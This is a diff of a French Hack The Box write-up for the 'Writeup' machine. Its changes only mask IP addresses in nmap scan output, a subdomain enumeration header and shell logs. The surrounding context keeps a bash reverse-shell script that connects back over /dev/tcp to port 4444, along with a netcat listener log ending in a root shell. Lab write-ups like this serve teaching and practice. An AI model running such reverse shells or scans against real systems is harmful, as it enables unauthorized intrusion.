@@ -180,7 +180,7 @@ Le scan initial TCP complet (`scans_nmap/full_tcp_scan.txt`) te révèle les por
 
 ```bash
 # Nmap 7.98 scan initiated Wed Jan 14 14:08:09 2026 as: /usr/lib/nmap/nmap --privileged -Pn -p- --min-rate 5000 -T4 -oN scans_nmap/full_tcp_scan.txt writeup.htb
-Nmap scan report for writeup.htb (10.129.40.181)
+Nmap scan report for writeup.htb (10.129.x.x)
 Host is up (0.011s latency).
 Not shown: 65533 filtered tcp ports (no-response)
 PORT   STATE SERVICE
@@ -202,7 +202,7 @@ Voici le résultat (`scans_nmap/aggressive_vuln_scan.txt`) :
     nmap -Pn -A -sV -p"22,80" --script="(http-vuln-* or http-shellshock or ssl-heartbleed) and not (http-vuln-cve2017-1001000 or http-sql-injection or ssl-cert or sslv2 or ssl-dh-params)" --script-timeout=30s -T4 "writeup.htb"
 
 # Nmap 7.98 scan initiated Wed Jan 14 14:08:36 2026 as: /usr/lib/nmap/nmap --privileged -Pn -A -sV -p22,80 "--script=(http-vuln-* or http-shellshock or ssl-heartbleed) and not (http-vuln-cve2017-1001000 or http-sql-injection or ssl-cert or sslv2 or ssl-dh-params)" --script-timeout=30s -T4 -oN scans_nmap/aggressive_vuln_scan_raw.txt writeup.htb
-Nmap scan report for writeup.htb (10.129.40.181)
+Nmap scan report for writeup.htb (10.129.x.x)
 Host is up (0.016s latency).
 
 PORT   STATE SERVICE VERSION
@@ -219,8 +219,8 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 TRACEROUTE (using port 22/tcp)
 HOP RTT      ADDRESS
-1   23.59 ms 10.10.14.1
-2   40.28 ms writeup.htb (10.129.40.181)
+1   23.59 ms 10.10.x.x
+2   40.28 ms writeup.htb (10.129.x.x)
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Wed Jan 14 14:09:04 2026 -- 1 IP address (1 host up) scanned in 27.92 seconds
@@ -235,7 +235,7 @@ Vient ensuite le scan ciblé CMS (`scans_nmap/cms_vuln_scan.txt`).
 
 ```bash
 # Nmap 7.98 scan initiated Wed Jan 14 14:09:04 2026 as: /usr/lib/nmap/nmap --privileged -Pn -sV -p22,80 --script=http-wordpress-enum,http-wordpress-brute,http-wordpress-users,http-drupal-enum,http-drupal-enum-users,http-joomla-brute,http-generator,http-robots.txt,http-title,http-headers,http-methods,http-enum,http-devframework,http-cakephp-version,http-php-version,http-config-backup,http-backup-finder,http-sitemap-generator --script-timeout=30s -T4 -oN scans_nmap/cms_vuln_scan.txt writeup.htb
-Nmap scan report for writeup.htb (10.129.40.181)
+Nmap scan report for writeup.htb (10.129.x.x)
 Host is up (0.0073s latency).
 
 PORT   STATE    SERVICE VERSION
@@ -255,7 +255,7 @@ Le scan UDP rapide (`scans_nmap/udp_vuln_scan.txt`).
 
 ```bash
 # Nmap 7.98 scan initiated Wed Jan 14 14:09:04 2026 as: /usr/lib/nmap/nmap --privileged -n -Pn -sU --top-ports 20 -T4 -oN scans_nmap/udp_vuln_scan.txt writeup.htb
-Nmap scan report for writeup.htb (10.129.40.181)
+Nmap scan report for writeup.htb (10.129.x.x)
 Host is up.
 
 PORT      STATE         SERVICE
@@ -396,7 +396,7 @@ Script       : mon-subdomains
 Version      : mon-subdomains 2.0.0
 Date         : 2026-01-14 14:15:28
 Domaine      : writeup.htb
-IP           : 10.129.40.181
+IP           : 10.129.x.x
 Mode         : large
 Master       : /usr/share/wordlists/htb-dns-vh-5000.txt
 Codes        : 200,301,302,401,403  (strict=1)
@@ -551,7 +551,7 @@ individual files in /usr/share/doc/*/copyright.
 
 Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
 permitted by applicable law.
-Last login: Wed Oct 25 11:04:00 2023 from 10.10.14.23
+Last login: Wed Oct 25 11:04:00 2023 from 10.10.x.x
 jkr@writeup:~$
 ```
 
@@ -755,7 +755,7 @@ nano reverse_shell
 
 ```bash
 #!/bin/bash
-bash -i >& /dev/tcp/10.10.14.xxx/4444 0>&1
+bash -i >& /dev/tcp/10.10.x.x/4444 0>&1
 ```
 
 1. Rends le script exécutable :
@@ -820,7 +820,7 @@ Vérifie avec `whoami` :
 └─$ nc -lvnp 4444      
 
 listening on [any] 4444 ...
-connect to [10.10.17.246] from (UNKNOWN) [10.129.49.2] 42754
+connect to [10.10.x.x] from (UNKNOWN) [10.129.x.x] 42754
 bash: cannot set terminal process group (3271): Inappropriate ioctl for device
 bash: no job control in this shell
 root@writeup:/# whoami
